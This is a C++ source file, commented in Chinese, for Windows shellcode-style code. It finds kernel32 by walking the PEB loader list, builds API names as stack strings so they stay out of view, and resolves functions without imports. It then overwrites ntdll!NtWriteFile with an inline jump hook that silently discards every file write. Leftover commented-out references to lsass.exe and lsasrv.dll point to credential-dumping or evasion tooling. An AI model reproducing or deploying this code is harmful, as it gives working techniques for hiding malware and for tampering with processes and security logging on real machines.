#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
//#include <stdio.h>

// #define DEBUG




typedef
FARPROC
(NTAPI* PNT_GetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef
HMODULE
(NTAPI* PNT_LoadLibraryA)(
    LPCSTR lpLibFileName
    );

typedef
HMODULE
(NTAPI* PNT_GetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef
BOOL
(NTAPI* PNT_VirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

 
#define TABLE_LENGTH 1024
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)

LRESULT HookedSendMessageW(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
) {
    // 我们只需要判断第一个filehandle就行了
    // 或者我们直接啥都不干，就是不让他写文件，什么文件都不让写，我们就直接给他返回STATUS_SUCCESS 
    return STATUS_SUCCESS;
}

inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return nullptr;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return nullptr;
}


inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    if (len / 2 != 12)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_psapi_name(WORD len, WCHAR* dll_name) {
    // 我们只需要定位kernel32，直接作为char处理即可
    // wchar的话，对于英文字符串，就是一个char一个0，结束符为两个0
    // len/2就是实际长度（不包括\0）,kernel32.dll长度就是12
    char DTwew[] = { 'p','s','a','p','i','.','d','l','l',0 };
    if (len / 2 != 9)return false;
    for (int i = 0; i < len / 2; i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != DTwew[i])return false;
    }
    return true;
}


inline bool _compare_lsass_name(char* dll_name) {
    // char oyctO[] = { 'l','s','a','s','s','.','e','x','e',0 }; 
    char oyctO[] = { 'i','m','m','3','2','.','d','l','l',0 };
    for (int i = 0; (dll_name[i] != 0) && (i < 9); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != oyctO[i])return false;
    }
    return true;
}

inline DWORD64 _return_hex_value(char _hex_char) {
    if (_hex_char == '0') {
        return 0;
    }
    if (_hex_char == '1') {
        return 1;
    }
    if (_hex_char == '2') {
        return 2;
    }
    if (_hex_char == '3') {
        return 3;
    }
    if (_hex_char == '4') {
        return 4;
    }
    if (_hex_char == '5') {
        return 5;
    }
    if (_hex_char == '6') {
        return 6;
    }
    if (_hex_char == '7') {
        return 7;
    }
    if (_hex_char == '8') {
        return 8;
    }
    if (_hex_char == '9') {
        return 9;
    }
    if (_hex_char == 'a') {
        return 10;
    }
    if (_hex_char == 'b') {
        return 11;
    }
    if (_hex_char == 'c') {
        return 12;
    }
    if (_hex_char == 'd') {
        return 13;
    }
    if (_hex_char == 'e') {
        return 14;
    }
    if (_hex_char == 'f') {
        return 15;
    }

}

inline bool _compare_lsasrv_name(char* dll_name) {
    // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 
    char zGlRm[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    // for (int i = 0; (dll_name[i] != 0) && (i < 10); i++) {
    for (int i = 0; (dll_name[i] != 0) && (i < 12); i++) {
        char c;
        TO_LOWERCASE(c, dll_name[i]);
        if (c != zGlRm[i])return false;
    }
    return true;
    //TO_LOWERCASE
}



int main() {

    // 读取gs寄存器的值获取到当前进程的peb
    DWORD64 _peb = __readgsqword(0x60);
    // 往后偏移0x18得到&ldr
    DWORD64 _p_ldr = _peb + 0x18;
    // 取出ldr的地址
    DWORD64 _ldr = *(reinterpret_cast<DWORD64*>(_p_ldr));
    // 往后偏移0x10得到&InLoadOrderModuleList
    DWORD64 _p_InLoadOrderModuleList = _ldr + 0x10;
    // 取出InLoadOrderModuleList地址
    DWORD64 _InLoadOrderModuleList = *(reinterpret_cast<DWORD64*>(_p_InLoadOrderModuleList));
    // 这个地址是_LDR_DATA_TABLE_ENTRY的第一个字段的地址，也就是_LDR_DATA_TABLE_ENTRY的地址
    // 记录下这个地址，然后开始遍历，直到flink=记录下来的地址
    // 遍历module
    // 实际测试发现这个链表有一个头结点，头结点中不保存实际数据，除了flink和blink，其余字段都是空的
    // 我们要在遍历过程中对dll名称进行对比，由于我们要编写shellcode，所以不能使用任何库函数，只能自己实现

    DWORD64 _entry_addr = _InLoadOrderModuleList;
    DWORD64 _kernel32_base_addr = 0;
    DWORD64 _psapi_base_addr = 0;
    while (1) {
        // 获取dll名称，0x58
        DWORD64 _dll_name = _entry_addr + 0x58;
        UNICODE_STRING* dll_name = reinterpret_cast<UNICODE_STRING*>(_dll_name);
        //wprintf(L"dll name: %s\n", dll_name->Buffer);
        // 获取dllbase地址，0x30
        DWORD64 _p_dll_base = _entry_addr + 0x30;
        DWORD64 _dll_base = *(reinterpret_cast<DWORD64*>(_p_dll_base));

#ifdef DEBUG

        if (0 == reinterpret_cast<DWORD64*>(_dll_base)) {
            MessageBoxA(NULL, "OK", "OK", MB_OK);
        }
        printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));
#endif // DEBUG

        if ((dll_name->Length != 0) && (_compare_kernel32_name(dll_name->Length, dll_name->Buffer))) {
            _kernel32_base_addr = _dll_base;
        }
        if ((dll_name->Length != 0) && (_compare_psapi_name(dll_name->Length, dll_name->Buffer))) {
            _psapi_base_addr = _dll_base;
        }
        // 获取flink
        _entry_addr = *(reinterpret_cast<DWORD64*>(_entry_addr));
        if (_InLoadOrderModuleList == _entry_addr) break;

    }
    //if (_kernel32_base_addr) {
    //    printf("kernel32.dll located, base address: %p\n", reinterpret_cast<DWORD64*>(_kernel32_base_addr));
    //}

    // 获取到kernel32的基地址之后需要获取其导出表，来定位我们需要用到的api
    // 我们需要解析kernel32.dll的PE结构
    // 这里我直接用了网上现成的代码
    // 把kernel32的基地址传上去，把想要获取的函数名称传上去即可
    char stack_string[50] = { 0 };
    stack_string[0] = 'L'; stack_string[1] = 'o'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'L'; stack_string[5] = 'i'; stack_string[6] = 'b'; stack_string[7] = 'r'; stack_string[8] = 'a'; stack_string[9] = 'r'; stack_string[10] = 'y'; stack_string[11] = 'A';
    VOID* _LoadLibraryA_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);
    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'P'; stack_string[4] = 'r'; stack_string[5] = 'o'; stack_string[6] = 'c'; stack_string[7] = 'A'; stack_string[8] = 'd'; stack_string[9] = 'd'; stack_string[10] = 'r'; stack_string[11] = 'e'; stack_string[12] = 's'; stack_string[13] = 's';
    VOID* _GetProcAddress_addr = get_func_by_name(reinterpret_cast<LPVOID>(_kernel32_base_addr), stack_string);


    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)_LoadLibraryA_addr;
    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)_GetProcAddress_addr;

    

    SecureZeroMemory(stack_string, 50);
stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'H'; stack_string[10] = 'a'; stack_string[11] = 'n'; stack_string[12] = 'd'; stack_string[13] = 'l'; stack_string[14] = 'e'; stack_string[15] = 'A';
    PNT_GetModuleHandleA NT_GetModuleHandleA = (PNT_GetModuleHandleA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    // 获取ntdll!NtWriteFile函数的地址
    HMODULE fuckyouhandle = NT_GetModuleHandleA("ntdll.dll");
    void* funcAddress = NT_GetProcAddress(fuckyouhandle, "NtWriteFile");

    SecureZeroMemory(stack_string, 50);
    stack_string[0] = 'V'; stack_string[1] = 'i'; stack_string[2] = 'r'; stack_string[3] = 't'; stack_string[4] = 'u'; stack_string[5] = 'a'; stack_string[6] = 'l'; stack_string[7] = 'P'; stack_string[8] = 'r'; stack_string[9] = 'o'; stack_string[10] = 't'; stack_string[11] = 'e'; stack_string[12] = 'c'; stack_string[13] = 't';
    PNT_VirtualProtect NT_VirtualProtect = (PNT_VirtualProtect)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);

    // 修改ntdll!NtWriteFile函数的地址的前0x10字节为可读写，因为我们只需要修改13字节，所以0x10足够了
    DWORD oldProtection;
    DWORD newProtection = PAGE_EXECUTE_READWRITE;
    //MessageBoxA(NULL, "OK", "OK", MB_OK);
    BOOL fuck=NT_VirtualProtect(funcAddress, 0x10, newProtection, &oldProtection);
    //printf("%d\n", fuck);


    //MessageBoxA(NULL, "OK", "OK", MB_OK);MessageBoxA(NULL, "OK", "OK", MB_OK);
    void* hookedFunctionAddr = &HookedSendMessageW;
    DWORD64 _hook_addr = reinterpret_cast<DWORD64>(hookedFunctionAddr);

    // 先往里面写入 mov rax
    BYTE caonimade[2] = { 0x48,0xb8 };
   // NT_CopyMemory((char*)funcAddress, caonimade, 2);
    //CopyMemory((char*)funcAddress, caonimade, 2);
    ((char*)funcAddress)[0] = caonimade[0];
    ((char*)funcAddress)[1] = caonimade[1];
    // 写入地址
    //CopyMemory((char*)funcAddress + 2, &_hook_addr, 8);

    ((char*)funcAddress)[2] = ((char*)&_hook_addr)[0]; 
    ((char*)funcAddress)[3] = ((char*)&_hook_addr)[1];
    ((char*)funcAddress)[4] = ((char*)&_hook_addr)[2];
    ((char*)funcAddress)[5] = ((char*)&_hook_addr)[3];

    ((char*)funcAddress)[6] = ((char*)&_hook_addr)[4];
    ((char*)funcAddress)[7] = ((char*)&_hook_addr)[5];
    ((char*)funcAddress)[8] = ((char*)&_hook_addr)[6];
    ((char*)funcAddress)[9] = ((char*)&_hook_addr)[7];
    // jmp rax
    BYTE array3123123123[2] = { 0xff, 0xe0 };
    //CopyMemory((char*)funcAddress + 2 + 8, array3123123123, 2);
    ((char*)funcAddress)[10] = array3123123123[0];
    ((char*)funcAddress)[11] = array3123123123[1];
    //MessageBoxA(NULL, "OK", "OK", MB_OK);
    return 0;
}
